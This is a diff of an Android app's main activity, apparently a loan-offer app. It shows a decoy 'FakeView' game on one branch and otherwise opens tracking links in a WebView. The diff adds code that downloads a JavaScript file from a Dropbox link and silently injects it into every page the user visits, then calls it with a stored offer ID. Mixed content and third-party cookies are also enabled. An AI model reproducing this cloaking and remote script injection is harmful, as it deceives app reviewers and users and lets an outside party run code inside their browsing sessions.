@@ -10,6 +10,8 @@ import android.content.SharedPreferences
 import android.graphics.Bitmap
 import android.graphics.Rect
 import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkRequest
 import android.net.Uri
 import android.os.*
 import android.provider.MediaStore
@@ -30,7 +32,6 @@ import com.facebook.applinks.AppLinkData
 import com.onesignal.OSNotification
 import com.onesignal.OneSignal
 import com.organizationzaim.multiapp.FakeView.Game.GameActivity
-import com.organizationzaim.multiapp.web.NetworkFalseActivity
 import kotlinx.coroutines.*
 import okhttp3.OkHttpClient
 import okhttp3.Request
@@ -42,29 +43,19 @@ import java.text.SimpleDateFormat
 import java.util.*
 
 
-class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler {
+class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler, FileChooseClient.ActivityChoser {
 
     private lateinit var okHttpClient: OkHttpClient
     private lateinit var preferences: SharedPreferences
+    private lateinit var dialog: AlertDialog
+    lateinit var script : String
 
     private var isConnected                                   = true
     private var webView: WebView?                             = null
     private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
     private var mCameraPhotoPath: String?                     = null
-    private var URL: String?                                  = null
-    private var progressBar: ProgressDialog?                  = null
     private var alertDialog: AlertDialog?                     = null
     private val backDeque: Deque<String> = LinkedList()
-    private lateinit var script : String
-
-    private val isNetworkAvailable2: Boolean
-        get() {
-            println("isNetworkAvailable2 called")
-            val info = (applicationContext
-                .getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
-                .activeNetworkInfo
-            return !(info == null || !info.isAvailable || !info.isConnected)
-        }
 
     private val handler = Handler(Looper.getMainLooper())
     private val conversionTask = object : Runnable {
@@ -85,6 +76,8 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
         }
     }
 
+    override var uploadMessage: ValueCallback<Array<Uri>>? = null
+
     companion object {
         private const val TAG = "MainA1ctivi"
         private const val INPUT_FILE_REQUEST_CODE = 1
@@ -94,13 +87,51 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        GlobalScope.launch(Dispatchers.Main) {
+            val analyticsJs =
+                "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //DEBUG!!!
+            val scriptTask =
+                async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }
+
+            script = scriptTask.await()
+        }
         FacebookSdk.setApplicationId("293366948652919")
 
         initWebView()
         initOkHttpClient()
         initSDK()
 
-        Log.d(TAG, "START1")
+        dialog = AlertDialog.Builder(this).apply {
+            setTitle("No Internet Connection")
+            setMessage("Turn on the the network")
+            setCancelable(false)
+            setFinishOnTouchOutside(false)
+        }.create()
+
+        if (isConnectedToNetwork()) {
+            mainInit() // дальнейшая инициализация
+        } else {
+            val firstDialog = AlertDialog.Builder(this).apply {
+                setTitle("No Internet Connection")
+                setMessage("Turn on the the network and try again")
+                setPositiveButton("Try Again", null)
+                setCancelable(false)
+                setFinishOnTouchOutside(false)
+            }.create()
+            firstDialog.show()
+            firstDialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
+                if (isConnectedToNetwork()) {
+                    firstDialog.dismiss()
+                    mainInit() // дальнейшая инициализация
+                }
+            }
+        }
+        registerNetworkCallback()
+
+    }
+
+//----------------------------------------CHECK-NETWORK-------------------------------------------//
+    private fun mainInit()                                                                     {
         preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)
         val strDeque = preferences.getString("PREFS_DEQUE", null)
         strDeque?.let {
@@ -112,11 +143,8 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
         Log.d(TAG, deque.isNotEmpty().toString() + "(*-*)")
         if (backDeque.isNotEmpty()) {
 
-            Log.d(TAG, "IS")
-            Log.d(TAG, backDeque.first.toString() + "!!!!")
-            Log.d(TAG, backDeque.first + ">><<<")
-
-            webView?.loadUrl(backDeque.first)
+            initWebView()
+            startWebView(backDeque.first)
             backDeque.removeFirst()
         } else {
             Log.d(TAG, "NOTHING")
@@ -134,7 +162,32 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
             }
         }
     }
+    private fun isConnectedToNetwork(): Boolean                                                {
+        val conn = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+        return conn?.activeNetworkInfo?.isConnected ?: true
+    }
+    private fun registerNetworkCallback()                                                      {
+        try {
+            val connectivityManager =
+                getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val builder = NetworkRequest.Builder()
 
+            connectivityManager.registerNetworkCallback(builder.build(), object :
+                ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    super.onAvailable(network)
+                    dialog.hide()
+                }
+
+                override fun onLost(network: Network) {
+                    super.onLost(network)
+                    dialog.show()
+                }
+            })
+        } catch (ex: java.lang.Exception) {
+            ex.printStackTrace()
+        }
+    }
 
 
 //-------------------------------------OK-HTTP-REQUEST--------------------------------------------//
@@ -171,9 +224,6 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
         AppLinkData.fetchDeferredAppLinkData(applicationContext) { appLinkData ->
             val uri: Uri? = appLinkData?.targetUri ?: AppLinks.getTargetUrlFromInboundIntent(this, intent)
 
-            // В переменную uri записывается отложенный диплинк appLinkData.targetUri
-            // Если он равен null, то диплинк берется из интента (getTargetUrlFromInboundIntent)
-
             if (uri != null && uri.query != null) {
                 processDeeplinkAndStart(uri.query!!) // передаем параметры диплинка дальше и обрабатываем
                 preferences.edit().putString("PREFS_DEEPLINK", uri.query!!).apply()
@@ -196,15 +246,10 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
         }
 
         GlobalScope.launch(Dispatchers.Main) {
-            Log.d(TAG, "TTTTTT")
-            val analyticsJs = "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //NOT CORRECTED!!
-            // Запускаем задачу на скачивание скрипта с дропбокса
-            var scriptTask = async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }
 
-            // ОБЯЗАТЕЛЬНО дожидаемся загрузки скрипта (!!!)
-            // Мы асинхронно пытаемся получить скрипт с дропбокса
-            // Поэтому в этом же launch {} контексте должен быть метод с ожиданием .await()
-            // И только после .await() в контексте launch {} можем продолжать код
+            val analyticsJs = "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //NOT CORRECTED!!
+            val scriptTask = async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }
+
             script = scriptTask.await()
             Log.d(TAG, "Script$script")
 
@@ -216,8 +261,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
                 startActivity(Intent(this@MainActivity, GameActivity::class.java))
                 finish()
             } else {
-                initWebView()
-//                handler.post(conversionTask) // Запускаем проверку конверсии по таймеру (Пункт 6)
+                handler.post(conversionTask)
 
                 OneSignal.sendTag("nobot", "1")
                 OneSignal.sendTag("bundle", BuildConfig.APPLICATION_ID)
@@ -227,150 +271,12 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
                 if (!streamId.isNullOrBlank()) {
                     OneSignal.sendTag("stream", streamId)
                 }
-
                 initWebView()
-
-                URL = finalUrl
-
-                webView?.loadUrl(URL!!)
-
-                webView?.setNetworkAvailable(isConnected)
-
-                val cookieManager = CookieManager.getInstance()
-                cookieManager.setAcceptCookie(true)
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
-                    cookieManager.setAcceptThirdPartyCookies(webView, true)
-                }
-                webView?.webViewClient = object : WebViewClient() {
-
-                    override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
-                        println("page loading started")
-                        if (!isNetworkAvailable2) {
-                            showInfoMessageDialog()
-                            println("network not available")
-                            return
-                        } else println("network available")
-                        super.onPageStarted(view, url, favicon)
-                    }
-
-                    override fun onPageFinished(view: WebView?, url: String?) {
-                        CookieManager.getInstance().flush() // Синхронизируем cookie
-//                        if (progressBar?.isShowing!!) {
-//                            progressBar?.dismiss()
-//                        }
-                        url?.let { if (it != "about:blank") addToDeque(it) }
-                        val queryId = preferences.getString("PREFS_QUERYID", "")
-                        webView?.evaluateJavascript(script) { // Загружаем в вебвью полученный раннее скрипт
-                            webView?.evaluateJavascript("q('$queryId');") {}
-                            Log.d(TAG, "load")
-                        }
-                    }
-
-                    override fun onReceivedError(view: WebView, errorCode: Int, description: String, failingUrl: String) {
-                        alertDialog?.setTitle("Error")
-                        alertDialog?.setMessage(description)
-                        alertDialog?.show()
-                        if (errorCode == ERROR_TIMEOUT) {
-                            view.stopLoading() // may not be needed
-                            // view.loadData(timeoutMessageHtml, "text/html", "utf-8");
-                        }
-                    }
-
-                    override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
-                        CookieSyncManager.getInstance().sync()
-                        view.loadUrl(url)
-                        Uri.parse(url).getQueryParameter("cust_offer_id")
-                            ?.let {
-                                // Получаем query id из текущей ссылки и если оно существует, сохраняем в хранилище
-                                preferences.edit().putString("PREFS_QUERYID", it).apply()
-                            }
-
-                        return false
-                    }
-
-                }
-                webView?.webChromeClient = object : WebChromeClient() {
-
-                    @SuppressLint("SimpleDateFormat")
-                    @Throws(IOException::class)
-                    private fun createImageFile(): File {
-                        // Create an image file name
-                        val timeStamp =
-                            SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
-                        val imageFileName = "JPEG_" + timeStamp + "_"
-                        val storageDir = Environment.getExternalStoragePublicDirectory(
-                            Environment.DIRECTORY_PICTURES
-                        )
-                        return File.createTempFile(
-                            imageFileName,  /* prefix */
-                            ".jpg",  /* suffix */
-                            storageDir /* directory */
-                        )
-                    }
-
-                    override fun onShowFileChooser(
-                        view: WebView,
-                        filePath: ValueCallback<Array<Uri>>,
-                        fileChooserParams: FileChooserParams
-                    ): Boolean {
-                        // Double check that we don't have any existing callbacks
-                        if (mFilePathCallback != null) {
-                            mFilePathCallback!!.onReceiveValue(null)
-                        }
-                        mFilePathCallback = filePath
-                        var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
-                        if (takePictureIntent!!.resolveActivity(packageManager) != null) {
-                            // Create the File where the photo should go
-                            var photoFile: File? = null
-                            try {
-                                photoFile = createImageFile()
-                                takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
-                            } catch (ex: IOException) {
-                                // Error occurred while creating the File
-                                Log.e(
-                                    MainActivity.TAG,
-                                    "Unable to create Image File",
-                                    ex
-                                )
-                            }
-                            // Continue only if the File was successfully created
-                            if (photoFile != null) {
-                                mCameraPhotoPath = "file:" + photoFile.absolutePath
-                                takePictureIntent.putExtra(
-                                    MediaStore.EXTRA_OUTPUT,
-                                    Uri.fromFile(photoFile)
-                                )
-                            } else {
-                                takePictureIntent = null
-                            }
-                        }
-                        val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
-                        contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
-                        contentSelectionIntent.type = "image/*"
-                        val intentArray: Array<Intent?>
-                        if (takePictureIntent != null) {
-                            intentArray = arrayOf<Intent?>(takePictureIntent)
-
-                        } else {
-                            intentArray = arrayOfNulls(0)
-                        }
-                        val chooserIntent = Intent(Intent.ACTION_CHOOSER)
-                        chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
-                        chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
-                        chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
-                        startActivityForResult(
-                            chooserIntent,
-                            MainActivity.INPUT_FILE_REQUEST_CODE
-                        )
-                        return true
-                    }
-                }
+                startWebView(finalUrl)
             }
         }
     }
     private fun getClickId(): String                                                           {
-        // Пробуем получить click_id из хранилища
-        // Если его там нет, получим null
         var clickId = preferences.getString("PREFS_CLICK_ID", null)
         if (clickId == null) {
             // в случае если в хранилище нет click_id, генерируем новый
@@ -404,6 +310,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
     webView?.scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
     webView?.settings?.loadWithOverviewMode = true
     webView?.settings?.useWideViewPort = true
+    webView?.settings?.javaScriptEnabled = true
     webView?.settings?.domStorageEnabled = true
     webView?.settings?.databaseEnabled = true
     webView?.settings?.setSupportZoom(false)
@@ -416,10 +323,53 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
     webView?.settings?.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
     webView?.settings?.mediaPlaybackRequiresUserGesture = true
 }
-    private fun showInfoMessageDialog()                                                        {
-        val intent = Intent(this, NetworkFalseActivity::class.java)
-        startActivity(intent)
-        finish()
+    private fun startWebView(startUrl:String)                                                  {
+        webView?.loadUrl(startUrl)
+
+        webView?.setNetworkAvailable(isConnected)
+
+        val cookieManager = CookieManager.getInstance()
+        cookieManager.setAcceptCookie(true)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            cookieManager.setAcceptThirdPartyCookies(webView, true)
+        }
+
+        webView?.webChromeClient = FileChooseClient(this)
+        webView?.webViewClient = object : WebViewClient() {
+            override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
+                super.onPageStarted(view, url, favicon)
+            }
+            override fun onPageFinished(view: WebView?, url: String?) {
+                CookieManager.getInstance().flush()
+//                        if (progressBar?.isShowing!!) {
+//                            progressBar?.dismiss()
+//                        }
+                url?.let { if (it != "about:blank") addToDeque(it) }
+                val queryId = preferences.getString("PREFS_QUERYID", "")
+                webView?.evaluateJavascript(script) {
+                    webView?.evaluateJavascript("q('$queryId');") {}
+                    Log.d(TAG, "load")
+                }
+            }
+            override fun onReceivedError(view: WebView, errorCode: Int, description: String, failingUrl: String) {
+                alertDialog?.setTitle("Error")
+                alertDialog?.setMessage(description)
+                alertDialog?.show()
+                if (errorCode == ERROR_TIMEOUT) {
+                    view.stopLoading()
+                    // view.loadData(timeoutMessageHtml, "text/html", "utf-8");
+                }
+            }
+            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
+                view.loadUrl(url)
+                Uri.parse(url).getQueryParameter("cust_offer_id")
+                    ?.let {
+                        preferences.edit().putString("PREFS_QUERYID", it).apply()
+                    }
+
+                return false
+            }
+        }
     }
     private fun toScroll(flag: Boolean)                                                        {
         if (flag){
@@ -452,30 +402,17 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
         }
     }
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?)            {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
-                super.onActivityResult(requestCode, resultCode, data)
-                return
-            }
-            var results: Array<Uri>? = null
-            // Check that the response is a good one
-            if (resultCode == Activity.RESULT_OK) {
-                if (data == null) {
-                    // If there is not data, then we may have taken a photo
-                    if (mCameraPhotoPath != null) {
-                        results = arrayOf(Uri.parse(mCameraPhotoPath))
-                    }
-                } else {
-                    val dataString = data.dataString
-                    if (dataString != null) {
-                        results = arrayOf(Uri.parse(dataString))
-                    }
-                }
-            }
-            mFilePathCallback!!.onReceiveValue(results)
-            mFilePathCallback = null
-        } else
-            return
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == FileChooseClient.ActivityChoser.REQUEST_SELECT_FILE) {
+            if (uploadMessage == null) return
+            uploadMessage?.onReceiveValue(
+                WebChromeClient.FileChooserParams.parseResult(
+                    resultCode,
+                    data
+                )
+            )
+            uploadMessage = null
+        }
     }
 
 //-----------------------------------Запоминание-пяти-последних-ссылок----------------------------//
@@ -579,7 +516,6 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
         AppsFlyerLib.getInstance().init(devKey, conversionDataListener, this)
         AppsFlyerLib.getInstance().startTracking(this)
     }
-
     override fun notificationReceived(notification: OSNotification) {
         val keys = notification.payload.additionalData.keys()
         while (keys.hasNext()) {
@@ -591,5 +527,4 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler 
             }
         }
     }
-
 }
